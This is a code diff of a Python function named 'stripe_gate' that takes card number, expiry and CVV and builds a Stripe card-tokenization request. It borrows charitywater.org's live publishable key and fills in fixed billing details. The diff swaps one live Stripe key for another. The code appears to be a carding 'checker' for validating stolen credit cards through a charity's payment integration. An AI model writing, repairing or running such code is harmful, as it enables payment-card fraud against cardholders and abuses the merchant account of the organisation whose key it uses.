@@ -10,7 +10,7 @@ async def stripe_gate(cc, month, year, cvv):
             "https://www.charitywater.org/",
         )
 
-        post = f"type=card&billing_details[address][postal_code]=10027&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=118+W+132nd+St&billing_details[email]=sachiopremiun%40gmail.com&billing_details[name]=Sachio+YT&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=N/A&muid=N/A&sid=N/A&payment_user_agent=stripe.js%2Fecd86a62ca%3B+stripe-js-v3%2Fecd86a62ca%3B+card-element&time_on_page=40820&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
+        post = f"type=card&billing_details[address][postal_code]=10027&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=118+W+132nd+St&billing_details[email]=sachiopremiun%40gmail.com&billing_details[name]=Sachio+YT&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=N/A&muid=N/A&sid=N/A&payment_user_agent=stripe.js%2Fecd86a62ca%3B+stripe-js-v3%2Fecd86a62ca%3B+card-element&time_on_page=40820&key=pk_live_51JnWMnKVhG51tYSBk0yxzFyOIFLR4GcfHPZs6hTo1R8WepGBnyrH1DWZycATG7CxWYs1wC1ReYZhDWvFAFQGOVp600pXAxM1Gn"
 
         head = {
             "Host": "api.stripe.com",
